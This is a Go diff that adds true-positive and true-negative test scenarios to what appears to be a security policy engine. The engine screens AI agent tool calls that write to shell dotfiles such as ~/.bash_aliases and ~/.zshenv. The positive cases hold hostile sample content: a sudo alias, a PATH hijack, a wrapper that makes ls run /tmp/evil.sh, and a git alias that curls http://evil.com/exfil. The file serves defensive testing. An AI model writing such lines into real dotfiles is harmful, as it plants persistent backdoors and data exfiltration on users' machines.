@@ -2588,4 +2588,64 @@ var TrueNegativeScenarios = []Scenario{
 		Category:         "credential-exposure/oauth-tokens",
 		Description:      "read_file to .github/copilot-instructions.md — workspace instructions file, not a Copilot OAuth token file (mcp-sec-block-github-copilot-access must not fire)",
 	},
+
+	// ---------------------------------------------------------------------------
+	// TP/TN: Shell alias/env file persistence (issue #639)
+	// mcp-persist-block-shell-profile-write extended to cover .bash_aliases,
+	// .bash_functions, .zsh_aliases, .zshenv
+	// ---------------------------------------------------------------------------
+	{
+		ID:               "MCP-TP-211",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.bash_aliases", "content": "alias sudo='sudo -E bash -c \"$@\"'"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-persistence-shell-profile",
+		Description:      "write_file to ~/.bash_aliases — injecting malicious alias sourced by .bashrc on every shell session (T1546.004, mcp-persist-block-shell-profile-write)",
+	},
+	{
+		ID:               "MCP-TP-212",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.zshenv", "content": "export PATH=/tmp/evil:$PATH"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-persistence-shell-profile",
+		Description:      "write_file to ~/.zshenv — sourced for ALL zsh processes including non-interactive scripts; PATH hijack enables persistent code execution (T1546.004, mcp-persist-block-shell-profile-write)",
+	},
+	{
+		ID:               "MCP-TP-213",
+		ToolName:         "edit_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.bash_functions", "content": "function ls() { /bin/ls \"$@\"; /tmp/evil.sh; }"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-persistence-shell-profile",
+		Description:      "edit_file to ~/.bash_functions — overrides ls with a malicious wrapper that runs every time ls is called (T1546.004, mcp-persist-block-shell-profile-write)",
+	},
+	{
+		ID:               "MCP-TP-214",
+		ToolName:         "append_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.zsh_aliases", "content": "alias git='git \"$@\"; curl -s http://evil.com/exfil'"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-persistence-shell-profile",
+		Description:      "append_file to ~/.zsh_aliases — appends an alias that exfiltrates on every git invocation (T1546.004, mcp-persist-block-shell-profile-write)",
+	},
+	{
+		ID:               "MCP-TN-114",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/workspace/project/scripts/setup-aliases.sh"},
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		Category:         "mcp-persistence-shell-profile",
+		Description:      "write_file to project script that sets up aliases — not a dotfile, no persistence rule fires",
+	},
+	{
+		ID:               "MCP-TN-115",
+		ToolName:         "read_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.bash_aliases"},
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		Category:         "mcp-persistence-shell-profile",
+		Description:      "read_file of ~/.bash_aliases — reading is allowed (only writes are blocked), persistence rule must not fire",
+	},
 }
